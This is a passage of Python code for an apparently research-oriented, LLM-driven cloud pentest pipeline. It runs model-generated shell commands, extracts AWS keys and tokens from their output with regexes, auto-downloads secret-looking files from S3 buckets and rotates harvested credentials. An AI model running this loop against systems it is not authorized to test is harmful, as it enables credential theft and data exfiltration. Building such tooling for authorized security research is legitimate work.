        except requests.exceptions.Timeout:
            logger.warning("  ⚠️ Chat API timeout")
        except Exception as e:
            logger.warning(f"  ⚠️ Chat API error: {e}")
        return None

    def get_plan(self, target_description: str, state: Dict) -> List[Dict]:
        """
        Ask the Planner AI: "Given this state, what should I do next?"
        Returns list of tasks. Tries /plan first, falls back to /chat/completions.
        """
        payload = {
            "target_description": target_description,
            "state": state,
        }
        if self.planner_model:
            payload["planner_model"] = self.planner_model

        try:
            r = requests.post(
                f"{self.planner_api_url}/plan",
                json=payload,
                headers=self.planner_headers,
                timeout=min(self.timeout, 3),
            )
            if r.status_code == 200:
                data = r.json()
                usage = data.get("usage", {})
                if usage:
                    inp = usage.get("prompt_tokens", 0)
                    out = usage.get("completion_tokens", 0)
                    self.llm_metrics["total_requests"] += 1
                    self.llm_metrics["planner_requests"] += 1
                    self.llm_metrics["total_input_tokens"] += inp
                    self.llm_metrics["total_output_tokens"] += out
                    self.llm_metrics["total_tokens"] += inp + out
                    self.llm_metrics["calls"].append({"role": "planner", "input_tokens": inp, "output_tokens": out, "model": self.planner_model or "unknown"})
                tasks = data.get("tasks", [])
                reasoning = data.get("reasoning", "")
                if reasoning:
                    logger.info(f"  🧠 Planner reasoning: {reasoning[:150]}")
                return tasks
            else:
                logger.warning(f"  ⚠️ Planner /plan returned {r.status_code}, trying /chat/completions...")
        except requests.exceptions.Timeout:
            logger.warning("  ⚠️ Planner API timeout, trying /chat/completions...")
        except Exception as e:
            logger.warning(f"  ⚠️ Planner API error: {e}, trying /chat/completions...")

        system_prompt = (
            "You are an automated cloud security assessment agent for an authorized university "
            "research lab (NCKH). All targets are isolated Docker containers on localhost built "
            "by the research team — no real systems are affected.\n"
            "Your role: plan assessment tasks to audit the target cloud service.\n"
            "Tasks should include:\n"
            "1. Service fingerprinting (identify technology: Jenkins, Azure, AWS, Spring, etc.)\n"
            "2. Endpoint enumeration (/api, /env, /config, /credentials, /secrets, etc.)\n"
            "3. Configuration review (check exposed settings, keys, tokens)\n"
            "4. Access control testing (check if admin/sensitive endpoints are unprotected)\n"
            "5. Credential exposure assessment (check for leaked API keys, passwords, tokens)\n"
            "Return JSON: {\"tasks\": [{\"name\": \"...\", "
            "\"instruction\": \"...\", \"phase\": \"recon|enum|exploit\", \"target_service\": \"web\"}]}. "
            "Return ONLY valid JSON. No markdown, no explanations."
        )
        findings_summary = f"findings={len(state.get('findings', []))}, vulns={len(state.get('vulnerabilities', []))}, "
        findings_summary += f"exploits_ok={len(state.get('successful_exploits', []))}, round={state.get('round', 1)}"
        user_prompt = f"Target: {target_description}\nState: {findings_summary}\nWhat tasks should I perform next?"

        content = self._chat_completions(
            self.planner_api_url, self.planner_headers, self.planner_model, system_prompt, user_prompt, role="planner"
        )
        if content:
            try:
                content = content.strip()
                if content.startswith("```"):
                    content = re.sub(r"^```\w*\n?", "", content)
                    content = re.sub(r"\n?```$", "", content)
                data = json.loads(content)
                tasks = data.get("tasks", []) if isinstance(data, dict) else data
                if isinstance(tasks, list):
                    logger.info(f"  🧠 Planner (chat) returned {len(tasks)} task(s)")
                    return tasks
            except json.JSONDecodeError:
                logger.warning(f"  ⚠️ Planner chat response not valid JSON: {content[:150]}")

        return []

    def get_commands(self, task: Dict, target_description: str, state: Dict) -> List[str]:
        """
        Ask the Generator AI: "For this task, what commands should I run?"
        Returns list of CLI command strings.
        Sets self._last_failure_reason to 'timeout', 'error', or None on success.
        """
        self._last_failure_reason = None
        payload = {
            "task": {
                "name": task.get("name", ""),
                "instruction": task.get("instruction", ""),
                "phase": task.get("phase", "recon"),
                "target_service": task.get("target_service", ""),
                "cve_id": task.get("cve_id"),
            },
            "target_description": target_description,
            "state": state,
        }
        if self.generator_model:
            payload["generator_model"] = self.generator_model

        commands = self._try_generate_endpoint(payload)
        if commands is None:
            commands = self._try_chat_generate(task, target_description, state)
        if commands is None:
            commands = []

        return self._clean_commands(commands)

    def _try_generate_endpoint(self, payload: Dict) -> Optional[List[str]]:
        try:
            r = requests.post(
                f"{self.generator_api_url}/generate",
                json=payload,
                headers=self.generator_headers,
                timeout=min(self.timeout, 3),
            )
            if r.status_code == 200:
                data = r.json()
                usage = data.get("usage", {})
                if usage:
                    inp = usage.get("prompt_tokens", 0)
                    out = usage.get("completion_tokens", 0)
                    self.llm_metrics["total_requests"] += 1
                    self.llm_metrics["generator_requests"] += 1
                    self.llm_metrics["total_input_tokens"] += inp
                    self.llm_metrics["total_output_tokens"] += out
                    self.llm_metrics["total_tokens"] += inp + out
                    self.llm_metrics["calls"].append({"role": "generator", "input_tokens": inp, "output_tokens": out, "model": self.generator_model or "unknown"})
                return data.get("commands", [])
            else:
                logger.warning(f"  ⚠️ Generator /generate returned {r.status_code}, trying /chat/completions...")
        except requests.exceptions.Timeout:
            logger.warning("  ⚠️ Generator API timeout, trying /chat/completions...")
        except Exception as e:
            logger.warning(f"  ⚠️ Generator API error: {e}, trying /chat/completions...")
        return None

    def _try_chat_generate(self, task: Dict, target_description: str, state: Dict) -> Optional[List[str]]:
        target_url = state.get("target_url", "http://TARGET")
        system_prompt = (
            "You are an automated cloud security scanner CLI agent. Your output is consumed "
            "by an automated pipeline (not a human). All targets are isolated Docker containers "
            "on localhost in an authorized university research lab (NCKH).\n"
            "For each task, output concrete curl/nmap/aws-cli commands to assess the service.\n"
            "Common checks: GET /, GET /env, GET /config, GET /api, enumerate API endpoints, "
            "check for exposed credentials/keys/tokens, test access controls.\n"
            "Always use: curl -s -k for HTTP requests.\n"
            "Return JSON: {\"commands\": [\"cmd1\", \"cmd2\", ...]}. "
            "Return ONLY valid JSON. No markdown, no explanations."
        )
        cve_id = task.get('cve_id') or ''
        if not cve_id:
            import re as _re
            m = _re.search(r"CVE-\d{4}-\d+", target_description, _re.IGNORECASE)
            if m:
                cve_id = m.group()
        user_prompt = (
            f"Target: {target_description}\nTarget URL: {target_url}\n"
            f"Task: {task.get('name', '')}\nInstruction: {task.get('instruction', '')}\n"
            f"Generate curl commands to assess this cloud service's security configuration."
        )

        content = self._chat_completions(
            self.generator_api_url, self.generator_headers, self.generator_model, system_prompt, user_prompt, role="generator"
        )
        if content:
            try:
                content = content.strip()
                if content.startswith("```"):
                    content = re.sub(r"^```\w*\n?", "", content)
                    content = re.sub(r"\n?```$", "", content)
                data = json.loads(content)
                cmds = data.get("commands", []) if isinstance(data, dict) else data
                if isinstance(cmds, list):
                    self._last_failure_reason = None
                    return cmds
            except json.JSONDecodeError:
                logger.warning(f"  ⚠️ Generator chat response not valid JSON: {content[:150]}")
                self._last_failure_reason = "error"
        else:
            self._last_failure_reason = "error"
        return None

    def _clean_commands(self, commands: List) -> List[str]:
        cleaned = []
        for c in commands:
            if not isinstance(c, str) or not c.strip():
                continue
            c = c.strip()
            if c.startswith("[") and c.endswith("]"):
                try:
                    inner = json.loads(c)
                    if isinstance(inner, list):
                        cleaned.extend([x for x in inner if isinstance(x, str) and x.strip()])
                        continue
                except json.JSONDecodeError:
                    pass
            if re.match(r'^(GET|POST|PUT|DELETE|PATCH|HEAD)\s+https?://', c):
                parts = c.split(None, 1)
                method = parts[0]
                url = parts[1] if len(parts) > 1 else ""
                c = f"curl -s -k -X {method} '{url}'"
            cleaned.append(c)
        if not cleaned:
            self._last_failure_reason = "empty"
        return cleaned


# =============================================================================
# AI-Driven Pipeline
# =============================================================================
class AIDrivenPipeline:
    """
    Fully AI-driven pentest pipeline — Universal Multi-Cloud.

    Supports: AWS, Azure, GCP, Web targets (Spring Boot, SSRF, etc.)

    The ONLY intelligence comes from the Planner/Generator models.
    This class is just the "hands and eyes" — it executes commands and
    reports back what it sees. All strategic decisions are made by the AI.

    Loop:
        1. Send current state to Planner → receive tasks
        2. For each task, send to Generator → receive commands
        3. Execute commands → collect output
        4. Parse output (extract creds, flags, findings) — passive sensing
        5. Update state
        6. Feed state back to Planner → repeat
    """

    def __init__(
        self,
        api: PlannerGeneratorAPI,
        executor: RealExecutor,
        target_description: str,
        target_url: str = "",
        max_rounds: int = 15,
    ):
        self.api = api
        self.executor = executor
        self.target_description = target_description
        self.target_url = target_url
        self.max_rounds = max_rounds

        # Auto-detect cloud providers from target description
        self.cloud_providers = self._detect_cloud_providers(target_description)

        # State — shared with Planner via API
        self.state = {
            "current_phase": "recon",
            "round": 0,
            "cloud_providers": self.cloud_providers,
            "recon_techniques_tried": [],
            "findings": [],
            "services_detected": [],
            "ports_open": [],
            # Vulnerability tracking
            "cve_candidates": [],
            "cve_candidates_info": [],
            "cve_tested": [],
            "cve_failed": [],
            "cve_success": [],
            "vulnerabilities_found": [],     # All vulns discovered
            "exploits_successful": [],       # Vulns successfully exploited
            "exploits_failed": [],           # Exploits that didn't work
            # Task tracking
            "tasks_completed": [],
            "exploit_attempted": False,
            "needs_deeper_recon": False,
            # Web recon fields
            "target_url": target_url,
            "web_endpoints": [],
            "credentials_found": {},
            "credential_sets": [],           # All credential sets found (ordered by discovery time)
            "dead_credentials": [],          # Credential sets that returned auth errors
            "flags_found": [],               # CTF flags (bonus, not a stop condition)
            "secrets_found": [],
            "target_info": {},
            "cloud_artifacts": {             # Discovered cloud resource identifiers
                "cognito_pool_ids": [],      # us-east-1:UUID format
                "cognito_user_pool_ids": [], # us-east-1_XXXXX format
                "s3_buckets": [],            # bucket names from URLs/HTML
                "s3_urls": [],               # full s3 URLs
                "arns": [],                  # AWS ARNs
                "api_endpoints": [],         # API Gateway / other API URLs
                "level_urls": [],            # Challenge/level URLs found in HTML
                "js_files": [],              # JavaScript file URLs
                "ecr_repos": [],             # ECR repository URIs
                "account_ids": [],           # AWS account IDs (12 digits)
                "regions": [],               # AWS regions discovered
            },
            "urls_to_follow": [],            # URLs discovered but not yet fetched
            # Command chaining — recent execution results for multi-step flows
            "execution_history": [],
            # Graph-lite memory (MVP)
            "graph_lite": {"nodes": [], "edges": [], "summary": {}},
            "graph_lite_summary": "",
            # Evidence verifier outputs
            "candidate_observations": [],
            "objective_verifications": [],
        }

        # Execution log (for report)
        self.execution_log: List[Dict] = []
        # Track stagnation — stop if no new findings for N consecutive rounds
        self._stagnation_counter = 0
        self._last_progress_signature = (
            progress_signature(self.state) if progress_signature else tuple()
        )
        # Command dedup — normalised commands already executed (skip repeats)
        self._executed_commands: set = set()
        # Compact summary of commands run per round (for planner context)
        self._commands_run_summary: List[str] = []
        self.executor.set_confirmed_credentials(self.state["credentials_found"])

    @staticmethod
    def _normalize_cmd(cmd: str) -> str:
        """Normalise a command for dedup: strip trailing whitespace, collapse pipes through head/tail."""
        c = cmd.strip()
        c = re.sub(r"\s*2>&1\s*\|\s*head\s*-\d+", "", c)
        c = re.sub(r"\s*\|\s*head\s*-\d+", "", c)
        c = re.sub(r"\s*\|\s*tail\s*-\d+", "", c)
        return c.strip()

    def _sync_executor_credentials(self) -> None:
        self.executor.set_confirmed_credentials(self.state.get("credentials_found", {}))

    def _refresh_graph_snapshot(self) -> None:
        if GRAPH_LITE_AVAILABLE and build_graph_lite_state:
            try:
                graph_lite = build_graph_lite_state(self.state, self.target_description)
                self.state["graph_lite"] = graph_lite
                self.state["graph_lite_summary"] = graph_lite.get("summary_text", "")
            except Exception as e:
                logger.debug(f"Graph-lite update failed: {e}")

    def _verify_and_commit_task(
        self,
        task: Dict[str, Any],
        task_name: str,
        command_results: List[Dict[str, Any]],
        state_before: Dict[str, Any],
    ) -> Dict[str, Any]:
        verification = {
            "task_name": task_name,
            "task_id": task.get("id", task_name),
            "action_id": task.get("action_id", task.get("id", task_name)),
            "objective_type": task.get("objective_type", task.get("phase", "generic")),
            "status": "unverified",
            "confidence": 0.0,
            "matched_rule_ids": [],
            "supporting_evidence_ids": [],
            "missing_evidence": ["objective_evidence_not_met"],
            "reason": "task execution did not satisfy a verified objective",
            "reportable": True,
            "timestamp": datetime.now().isoformat(),
        }
        if not command_results:
            verification["reason"] = "generator produced no executable commands"
            verification["missing_evidence"] = ["generator_no_commands"]
        elif EVIDENCE_VERIFIER_AVAILABLE and verify_task_execution:
            try:
                verification = verify_task_execution(
                    task=task,
                    command_results=command_results,
                    state_before=state_before,
                    state_after=self.state,
                )
            except Exception as e:
                verification["reason"] = f"verifier error: {e}"
                verification["missing_evidence"] = ["verifier_exception"]

        verification.setdefault("task_name", task_name)
        if STATE_COMMIT_AVAILABLE and finalize_transition:
            finalize_transition(self.state, state_before, verification, task)
        else:
            self.state.setdefault("objective_verifications", []).append(dict(verification))

        self._sync_executor_credentials()
        self._refresh_graph_snapshot()

        if verification.get("status") == "verified":
            if task_name not in self.state["tasks_completed"]:
                self.state["tasks_completed"].append(task_name)
            logger.info(f"     🧪 Verifier: VERIFIED - {verification.get('reason', '')[:120]}")
        else:
            logger.info(
                f"     🧪 Verifier: {str(verification.get('status', 'unknown')).upper()} - "
                f"{verification.get('reason', '')[:120]}"
            )
        return verification

    # ─── Command Chaining Helpers ───────────────────────────────────────
    # Patterns for detecting "critical output" that should trigger re-generation
    CRITICAL_OUTPUT_PATTERNS = {
        "imdsv2_token": re.compile(r"(AQAEA[A-Za-z0-9_/+=]{20,})", re.DOTALL),
        "aws_access_key": re.compile(r"((?:AKIA|ASIA)[A-Z0-9]{16})", re.DOTALL),
        "aws_secret_key": re.compile(r'"(?:SecretAccessKey|AWS_SECRET_ACCESS_KEY)"\s*:\s*"([^"]+)"', re.DOTALL),
        "aws_session_token": re.compile(r'"(?:Token|SessionToken|AWS_SESSION_TOKEN)"\s*:\s*"([^"]+)"', re.DOTALL),
        "iam_role": re.compile(r"/iam/security-credentials/([A-Za-z0-9_-]+)", re.DOTALL),
        "bucket_name": re.compile(r"(?:BUCKET[=:]\s*|s3://)([\w.-]+)", re.IGNORECASE),
    }

    CLOUD_ARTIFACT_PATTERNS = {
        "cognito_identity_pool": re.compile(
            r"((?:us|eu|ap|sa|ca|me|af)-(?:east|west|central|south|north|northeast|southeast|southwest|northwest)-\d:[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12})",
            re.IGNORECASE,
        ),
        "cognito_user_pool": re.compile(
            r"((?:us|eu|ap|sa|ca|me|af)-(?:east|west|central|south|north|northeast|southeast|southwest|northwest)-\d_[A-Za-z0-9]{9})",
        ),
        "aws_account_id": re.compile(r"(?:^|[:\s\"'/])(\d{12})(?:$|[:\s\"'/])", re.MULTILINE),
        "aws_arn": re.compile(r"(arn:aws[a-z-]*:[a-z0-9-]+:[a-z0-9-]*:\d{12}:[^\s\"',]+)"),
        "s3_url": re.compile(
            r"((?:https?://)?(?:[\w.-]+\.s3(?:[.-][a-z0-9-]+)?\.amazonaws\.com|s3(?:[.-][a-z0-9-]+)?\.amazonaws\.com/[\w.-]+)[^\s\"'<>]*)",
            re.IGNORECASE,
        ),
        "s3_bucket_from_url": re.compile(
            r"(?:https?://)?([\w.-]+)\.s3(?:[.-][a-z0-9-]+)?\.amazonaws\.com", re.IGNORECASE,
        ),
        "s3_uri": re.compile(r"s3://([\w.-]+)"),
        "api_gateway": re.compile(
            r"(https://[a-z0-9]+\.execute-api\.[a-z0-9-]+\.amazonaws\.com[^\s\"'<>]*)", re.IGNORECASE,
        ),
        "ecr_repo": re.compile(
            r"(\d{12}\.dkr\.ecr\.[a-z0-9-]+\.amazonaws\.com/[\w./-]+)", re.IGNORECASE,
        ),
        "cloudfront_url": re.compile(
            r"(https?://[a-z0-9]+\.cloudfront\.net[^\s\"'<>]*)", re.IGNORECASE,
        ),
        "level_url": re.compile(
            r'(?:href|src|action|url|location|redirect)\s*[=:]\s*["\']?(https?://[^\s"\'<>]+)',
            re.IGNORECASE,
        ),
        "js_file": re.compile(
            r'(?:src|href)\s*=\s*["\']([^"\']*\.js(?:\?[^"\']*)?)["\']', re.IGNORECASE,
        ),
        "aws_region": re.compile(
            r"((?:us|eu|ap|sa|ca|me|af)-(?:east|west|central|south|north|northeast|southeast|southwest|northwest)-\d)",
        ),
    }

    CREDENTIAL_ERROR_PATTERNS = [
        re.compile(r"InvalidClientTokenId", re.IGNORECASE),
        re.compile(r"ExpiredToken(?:Exception)?", re.IGNORECASE),
        re.compile(r"The security token included in the request is expired", re.IGNORECASE),
        re.compile(r"The security token included in the request is invalid", re.IGNORECASE),
        re.compile(r"UnrecognizedClientException", re.IGNORECASE),
        re.compile(r"InvalidIdentityToken", re.IGNORECASE),
        re.compile(r"Request has expired", re.IGNORECASE),
        re.compile(r"Unable to locate credentials", re.IGNORECASE),
    ]

    def _extract_cloud_artifacts(self, text: str, source_url: str = ""):
        """Extract cloud resource identifiers from any command output (HTML, JSON, JS, plaintext)."""
        if not text:
            return
        artifacts = self.state["cloud_artifacts"]

        for m in self.CLOUD_ARTIFACT_PATTERNS["cognito_identity_pool"].finditer(text):
            pool_id = m.group(1)
            if pool_id not in artifacts["cognito_pool_ids"]:
                artifacts["cognito_pool_ids"].append(pool_id)
                logger.info(f"     🧩 ARTIFACT: Cognito Identity Pool = {pool_id}")

        for m in self.CLOUD_ARTIFACT_PATTERNS["cognito_user_pool"].finditer(text):
            pool_id = m.group(1)
            if pool_id not in artifacts["cognito_user_pool_ids"]:
                artifacts["cognito_user_pool_ids"].append(pool_id)
                logger.info(f"     🧩 ARTIFACT: Cognito User Pool = {pool_id}")

        for m in self.CLOUD_ARTIFACT_PATTERNS["aws_arn"].finditer(text):
            arn = m.group(1)
            if arn not in artifacts["arns"]:
                artifacts["arns"].append(arn)
                logger.info(f"     🧩 ARTIFACT: ARN = {arn[:80]}")

        for m in self.CLOUD_ARTIFACT_PATTERNS["s3_url"].finditer(text):
            url = m.group(1)
            if url not in artifacts["s3_urls"] and "/doc/2006-03-01" not in url:
                artifacts["s3_urls"].append(url)
                logger.info(f"     🧩 ARTIFACT: S3 URL = {url[:80]}")

        for pat_name in ("s3_bucket_from_url", "s3_uri"):
            for m in self.CLOUD_ARTIFACT_PATTERNS[pat_name].finditer(text):
                bucket = m.group(1)
                # Skip redundant .s3.amazonaws.com suffixes — the base bucket name is enough
                if ".s3." in bucket or bucket.endswith(".amazonaws.com"):
                    continue
                if bucket not in artifacts["s3_buckets"] and len(bucket) > 2:
                    artifacts["s3_buckets"].append(bucket)
                    logger.info(f"     🧩 ARTIFACT: S3 bucket = {bucket}")

        for m in self.CLOUD_ARTIFACT_PATTERNS["api_gateway"].finditer(text):
            url = m.group(1)
            if url not in artifacts["api_endpoints"]:
                artifacts["api_endpoints"].append(url)
                if url not in self.state["urls_to_follow"]:
                    self.state["urls_to_follow"].append(url)
                logger.info(f"     🧩 ARTIFACT: API Gateway = {url[:80]}")

        for m in self.CLOUD_ARTIFACT_PATTERNS["ecr_repo"].finditer(text):
            repo = m.group(1)
            if repo not in artifacts["ecr_repos"]:
                artifacts["ecr_repos"].append(repo)
                logger.info(f"     🧩 ARTIFACT: ECR repo = {repo}")

        for m in self.CLOUD_ARTIFACT_PATTERNS["cloudfront_url"].finditer(text):
            url = m.group(1)
            if url not in artifacts["api_endpoints"]:
                artifacts["api_endpoints"].append(url)
                if url not in self.state["urls_to_follow"]:
                    self.state["urls_to_follow"].append(url)

        for m in self.CLOUD_ARTIFACT_PATTERNS["aws_account_id"].finditer(text):
            acct = m.group(1)
            if acct not in artifacts["account_ids"] and not acct.startswith("169254"):
                artifacts["account_ids"].append(acct)
                logger.info(f"     🧩 ARTIFACT: AWS Account ID = {acct}")

        for m in self.CLOUD_ARTIFACT_PATTERNS["aws_region"].finditer(text):
            region = m.group(1)
            if region not in artifacts["regions"]:
                artifacts["regions"].append(region)

        target_host = ""
        if self.state.get("target_url"):
            from urllib.parse import urlparse
            target_host = urlparse(self.state["target_url"]).hostname or ""

        for m in self.CLOUD_ARTIFACT_PATTERNS["level_url"].finditer(text):
            url = m.group(1)
            if url not in artifacts["level_urls"] and len(url) > 10:
                is_relevant = (
                    target_host and target_host.split(".")[0] in url
                ) or any(kw in url.lower() for kw in [
                    "flaws", "wiz", "ctf", "level", "challenge", "s3.amazonaws",
                    "cloudfront", "execute-api", "blob.core.windows.net",
                    "storage.googleapis.com", "azurewebsites.net", "herokuapp.com",
                    "lambda-url", "apprunner",
                ])
                if is_relevant:
                    artifacts["level_urls"].append(url)
                    if url not in self.state["urls_to_follow"]:
                        self.state["urls_to_follow"].append(url)
                    logger.info(f"     🧩 ARTIFACT: Level URL = {url[:80]}")
                    from urllib.parse import urlparse as _urlparse
                    _host = _urlparse(url if "://" in url else f"http://{url}").hostname or ""
                    if (_host
                            and ".s3." not in _host
                            and not _host.endswith(".amazonaws.com")
                            and not _host.endswith(".googleapis.com")
                            and not _host.endswith(".windows.net")):
                        candidates = self._s3_bucket_candidates(_host)
                        for cand in candidates:
                            if cand not in artifacts["s3_buckets"]:
                                artifacts["s3_buckets"].append(cand)
                                logger.info(f"     🪣 Auto-added S3 bucket probe: {cand}")

        for m in self.CLOUD_ARTIFACT_PATTERNS["js_file"].finditer(text):
            js_path = m.group(1)
            if js_path.startswith("//"):
                js_path = "https:" + js_path
            elif js_path.startswith("/") and source_url:
                from urllib.parse import urlparse
                parsed = urlparse(source_url)
                js_path = f"{parsed.scheme}://{parsed.netloc}{js_path}"
            elif not js_path.startswith("http") and source_url:
                js_path = source_url.rstrip("/") + "/" + js_path
            if js_path.startswith("http") and js_path not in artifacts["js_files"]:
                artifacts["js_files"].append(js_path)
                if js_path not in self.state["urls_to_follow"]:
                    self.state["urls_to_follow"].append(js_path)
                logger.info(f"     🧩 ARTIFACT: JS file = {js_path[:80]}")

        if len(self.state.get("urls_to_follow", [])) > 50:
            self.state["urls_to_follow"] = self.state["urls_to_follow"][-30:]

        # Cap artifact sublists to prevent unbounded growth
        _ARTIFACT_MAX = 50
        for key in ("arns", "s3_urls", "s3_buckets", "api_endpoints",
                     "level_urls", "js_files", "ecr_repos", "account_ids"):
            lst = artifacts.get(key, [])
            if len(lst) > _ARTIFACT_MAX:
                artifacts[key] = lst[-_ARTIFACT_MAX:]

    _FALSE_POSITIVE_PATTERNS = re.compile(
        r"(?:An error occurred|AccessDenied|NoSuchBucket|NoSuchKey|"
        r"InvalidAccessKeyId|ExpiredToken|InvalidToken|"
        r"AuthorizationHeaderMalformed|SignatureDoesNotMatch|"
        r"AllAccessDisabled|AccountProblem|InvalidBucketName|"
        r"403 Forbidden|401 Unauthorized|HTTP error:|"
        r"AUTHENTICATIONFAILED|AuthorizationFailed|"
        r"HttpResponseError|PERMISSION_DENIED|UNAUTHENTICATED)",
        re.IGNORECASE,
    )

    @staticmethod
    def _is_false_positive_success(result: Dict) -> bool:
        """Detect when exit code=0 but output contains cloud error messages.
        Common when AWS/Azure/GCP CLI errors are piped through '2>&1 | head'.
        """
        combined = (result.get("stdout", "") + " " + result.get("stderr", ""))[:500]
        if not combined.strip():
            return False
        return bool(AIDrivenPipeline._FALSE_POSITIVE_PATTERNS.search(combined))

    def _detect_credential_errors(self, result: Dict) -> bool:
        """Check if command output indicates expired/invalid credentials."""
        stderr = result.get("stderr", "")
        stdout = result.get("stdout", "")
        combined = stderr + " " + stdout
        for pattern in self.CREDENTIAL_ERROR_PATTERNS:
            if pattern.search(combined):
                return True
        return False

    def _mark_credentials_dead(self):
        """Move current credentials to dead list and try to use the next set."""
        current = self.state["credentials_found"].copy()
        if not current.get("AWS_ACCESS_KEY_ID"):
            return
        ak = current["AWS_ACCESS_KEY_ID"]
        if not any(d.get("AWS_ACCESS_KEY_ID") == ak for d in self.state["dead_credentials"]):
            self.state["dead_credentials"].append(current)
            logger.info(f"     💀 Credential DEAD: {ak[:12]}... — marking as expired")

        for cred_set in reversed(self.state["credential_sets"]):
            cset_ak = cred_set.get("AWS_ACCESS_KEY_ID", "")
            if cset_ak and not any(
                d.get("AWS_ACCESS_KEY_ID") == cset_ak for d in self.state["dead_credentials"]
            ):
                self.state["credentials_found"] = cred_set.copy()
                self.executor.update_credentials(cred_set)
                logger.info(f"     🔄 Switched to credential: {cset_ak[:12]}...")
                return
        self.state["credentials_found"] = {}
        logger.info("     ⚠️ No live credentials remaining")

    _S3_SAFE_PATH_RE = re.compile(r"^[A-Za-z0-9._/+=@:%-]+$")

    @classmethod
    def _safe_s3_path(cls, path: str) -> Optional[str]:
        """Validate and return an S3 path component, or None if it contains shell metacharacters."""
        path = path.strip()
        if not path or len(path) > 1024:
            return None
        if cls._S3_SAFE_PATH_RE.match(path):
            return path
        return None

    # ── Interesting filename patterns for auto-download after S3 ls ──
    _S3_INTERESTING_PATTERNS = re.compile(
        r"(?:secret|flag|private|credential|password|token|key|config|\.env|\.pem|\.key|\.sql|\.bak)",
        re.IGNORECASE,
    )
    _S3_INTERESTING_EXTENSIONS = {".html", ".txt", ".json", ".xml", ".yml", ".yaml",
                                  ".env", ".pem", ".key", ".sql", ".bak", ".csv", ".log"}

    def _auto_s3_download_interesting(self, bucket: str, s3_ls_stdout: str,
                                       sign_flag: str,
                                       task_name: str, task_phase: str,
                                       round_num: int, max_downloads: int = 5,
                                       prefix: str = "", _depth: int = 0):
        """Parse `aws s3 ls` output and auto-download files that look interesting.

        Works for both --no-sign-request (anonymous) and credential-based access.
        sign_flag should be '--no-sign-request' or '' (empty for credential-based).
        Recurses into PRE prefixes up to depth 2.
        """
        if not s3_ls_stdout or not s3_ls_stdout.strip():
            return

        interesting_keys: list[str] = []
        sub_prefixes: list[str] = []
        for line in s3_ls_stdout.split("\n"):
            line = line.strip()
            if not line:
                continue
            if line.startswith("PRE "):
                sub_prefix = line[4:].strip()
                if sub_prefix and _depth < 2:
                    sub_prefixes.append(sub_prefix)
                continue
            parts = line.split()
            if len(parts) < 4:
                continue
            obj_key = parts[-1]
            _, ext = os.path.splitext(obj_key)
            is_interesting = (
                self._S3_INTERESTING_PATTERNS.search(obj_key)
                or ext.lower() in self._S3_INTERESTING_EXTENSIONS
            )
            if is_interesting:
                interesting_keys.append(f"{prefix}{obj_key}")

        # Recurse into sub-prefixes
        for sub_prefix in sub_prefixes[:3]:
            safe_sub = self._safe_s3_path(sub_prefix)
            if not safe_sub:
                continue
            full_prefix = f"{prefix}{safe_sub}"
            ls_cmd = f"aws s3 ls s3://{bucket}/{full_prefix} {sign_flag}".strip()
            already_listed = getattr(self, "_s3_listed_prefixes", set())
            pkey = f"{bucket}/{full_prefix}"
            if pkey in already_listed:
                continue
            already_listed.add(pkey)
            self._s3_listed_prefixes = already_listed

            logger.info(f"     📂 AUTO-LS prefix: s3://{bucket}/{full_prefix}")
            ls_result = self.executor.run(ls_cmd)
            ls_result["task"] = f"AUTO-LS: s3://{bucket}/{full_prefix}"
            ls_result["phase"] = task_phase
            ls_result["round"] = round_num
            ls_result["timestamp"] = datetime.now().isoformat()
            self.execution_log.append(ls_result)
            if ls_result["success"] and ls_result.get("stdout", "").strip():
                self._parse_output(ls_cmd, ls_result)
                self._auto_s3_download_interesting(
                    bucket=bucket,
                    s3_ls_stdout=ls_result["stdout"],
                    sign_flag=sign_flag,
                    task_name=task_name,
                    task_phase=task_phase,
                    round_num=round_num,
                    max_downloads=max_downloads,
                    prefix=full_prefix,
                    _depth=_depth + 1,
                )

        if not interesting_keys:
            return

        logger.info(f"     📥 AUTO-DOWNLOAD: {len(interesting_keys)} interesting file(s) in s3://{bucket}/")

        already_downloaded = getattr(self, "_s3_downloaded", set())
        downloaded = 0
        for obj_key in interesting_keys[:max_downloads]:
            safe_key = self._safe_s3_path(obj_key)
            if not safe_key:
                continue
            dl_key = f"{bucket}/{safe_key}"
            if dl_key in already_downloaded:
                continue
            already_downloaded.add(dl_key)

            dl_cmd = f"aws s3 cp s3://{bucket}/{safe_key} - {sign_flag}".strip()
            logger.info(f"     📥 AUTO$ {dl_cmd[:100]}")
            dl_result = self.executor.run(dl_cmd)
            dl_result["task"] = f"AUTO-DL: s3://{bucket}/{obj_key}"
            dl_result["phase"] = task_phase
            dl_result["round"] = round_num
            dl_result["timestamp"] = datetime.now().isoformat()
            self.execution_log.append(dl_result)
            self._add_to_execution_history(dl_cmd, dl_result)

            if dl_result["success"] and dl_result.get("stdout", "").strip():
                stdout_text = dl_result["stdout"]
                logger.info(f"     ✅ Downloaded {obj_key} ({len(stdout_text)} bytes)")
                if len(stdout_text) < 500:
                    logger.info(f"        → {stdout_text[:300]}")
                self._parse_output(dl_cmd, dl_result)
                self.state["exploits_successful"].append({
                    "command": dl_cmd[:200],
                    "round": round_num,
                    "success": True,
                })
                downloaded += 1
            else:
                err = dl_result.get("stderr", "")[:150]
                logger.info(f"     ❌ Failed to download {obj_key}: {err}")

        self._s3_downloaded = already_downloaded
        if downloaded:
            logger.info(f"     📥 Auto-downloaded {downloaded} file(s) from s3://{bucket}/")

    def _store_credential_set(self, creds: Dict[str, str]):
        """Store a credential set in the ordered list (deduped by access key)."""
        ak = creds.get("AWS_ACCESS_KEY_ID", "")
        if not ak:
            return
        if not any(cs.get("AWS_ACCESS_KEY_ID") == ak for cs in self.state["credential_sets"]):
            self.state["credential_sets"].append(creds.copy())

    def _add_to_execution_history(self, command: str, result: Dict):
        """Add a command result to execution_history (kept compact for LLM context window)."""
        stdout = result.get("stdout", "")
        stderr = result.get("stderr", "")

        # Smart truncation: if output contains AWS credentials JSON, extract key=value pairs only
        max_output = 400
        if len(stdout) > max_output:
            # Check if it's a credential JSON — extract just the key fields
            cred_summary = self._summarize_credential_output(stdout)
            if cred_summary:
                stdout = cred_summary
            else:
                stdout = stdout[:max_output] + f"\n... [truncated, {len(result.get('stdout',''))} bytes total]"
        if len(stderr) > max_output:
            stderr = stderr[:max_output] + f"\n... [truncated]"

        entry = {
            "command": command[:300],
            "stdout": stdout,
            "stderr": stderr[:200] if stderr else "",
            "success": result.get("success", False),
        }
        self.state["execution_history"].append(entry)

        # Keep only last 5 entries to stay within context window
        if len(self.state["execution_history"]) > 5:
